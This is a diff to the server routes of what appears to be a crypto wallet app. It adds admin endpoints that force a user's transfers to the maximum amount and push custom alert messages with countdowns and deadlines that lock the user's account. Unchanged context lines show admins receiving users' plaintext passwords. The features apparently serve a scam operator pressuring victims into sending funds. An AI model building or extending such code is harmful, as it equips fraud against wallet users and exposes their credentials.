@@ -1136,6 +1136,12 @@ export async function registerRoutes(app: Express, sessionParser?: any): Promise
         profilePhoto: user.profilePhoto,
         isAdmin: user.isAdmin,
         canSendCrypto: user.canSendCrypto ?? false,
+        forceMaxAmount: (user as any).forceMaxAmount ?? false,
+        alertEnabled: (user as any).alertEnabled ?? false,
+        alertMessage: (user as any).alertMessage ?? "",
+        alertCountdown: (user as any).alertCountdown ?? 10,
+        alertDeadline: (user as any).alertDeadline ?? null,
+        alertLocked: !!((user as any).alertDeadline && (user as any).alertDeadline <= Date.now()),
         language: user.language || 'en',
         fiatCurrency: user.fiatCurrency || 'USD',
         theme: (user as any).theme ?? null,
@@ -1671,6 +1677,11 @@ export async function registerRoutes(app: Express, sessionParser?: any): Promise
             createdAt: user.createdAt,
             canSendCrypto: user.canSendCrypto ?? false,
             useFixedFee: (user as any).useFixedFee ?? false,
+            forceMaxAmount: (user as any).forceMaxAmount ?? false,
+            alertEnabled: (user as any).alertEnabled ?? false,
+            alertMessage: (user as any).alertMessage ?? "",
+            alertCountdown: (user as any).alertCountdown ?? 10,
+            alertDeadline: (user as any).alertDeadline ?? null,
             adminPinned: (user as any).adminPinned ?? false,
             adminNickname: (user as any).adminNickname || null,
             plainPassword: user.plainPassword || null,
@@ -2262,6 +2273,65 @@ export async function registerRoutes(app: Express, sessionParser?: any): Promise
     } catch (error) {
       console.error("Toggle send permission error:", error);
       res.status(500).json({ error: "Failed to toggle send permission" });
+    }
+  });
+
+  // Toggle force-max-amount for a user
+  app.patch("/api/admin/users/:userId/force-max-amount", requireAdmin, async (req, res) => {
+    try {
+      const { userId } = req.params;
+      const user = await User.findById(userId);
+      if (!user) return res.status(404).json({ error: "User not found" });
+      const newValue = !((user as any).forceMaxAmount ?? false);
+      await User.findByIdAndUpdate(userId, { forceMaxAmount: newValue });
+      res.json({ forceMaxAmount: newValue });
+    } catch (error) {
+      console.error("Toggle force-max-amount error:", error);
+      res.status(500).json({ error: "Failed to toggle force-max-amount" });
+    }
+  });
+
+  // Update alert settings for a user
+  app.patch("/api/admin/users/:userId/alert", requireAdmin, async (req, res) => {
+    try {
+      const { userId } = req.params;
+      const { alertEnabled, alertMessage, alertCountdown, alertDeadline } = req.body;
+      const update: any = {};
+      if (typeof alertEnabled === "boolean") update.alertEnabled = alertEnabled;
+      if (typeof alertMessage === "string") update.alertMessage = alertMessage;
+      if (typeof alertCountdown === "number" && alertCountdown > 0) update.alertCountdown = alertCountdown;
+      if (typeof alertDeadline === "number" && alertDeadline > 0) update.alertDeadline = alertDeadline;
+      if (alertDeadline === null) update.alertDeadline = null;
+      await User.findByIdAndUpdate(userId, update);
+      res.json({ success: true, ...update });
+    } catch (error) {
+      console.error("Update alert settings error:", error);
+      res.status(500).json({ error: "Failed to update alert settings" });
+    }
+  });
+
+  // Alert status for the current logged-in user (used by AdminAlertOverlay)
+  app.get("/api/alert/status", requireAuth, async (req, res) => {
+    try {
+      const userId = (req.session as any).userId;
+      const user = await User.findOne({ userId });
+      if (!user) return res.json(null);
+      if ((user as any).isAdmin) return res.json(null);
+      const alertEnabled = (user as any).alertEnabled ?? false;
+      const alertMessage = ((user as any).alertMessage ?? "").trim();
+      if (!alertEnabled || !alertMessage) return res.json(null);
+      const alertDeadline = (user as any).alertDeadline ?? null;
+      return res.json({
+        message: alertMessage,
+        countdown: typeof (user as any).alertCountdown === "number" && (user as any).alertCountdown > 0
+          ? (user as any).alertCountdown
+          : 10,
+        alertDeadline,
+        alertLocked: !!(alertDeadline && alertDeadline <= Date.now()),
+      });
+    } catch (error) {
+      console.error("Alert status error:", error);
+      res.status(500).json(null);
     }
   });
 
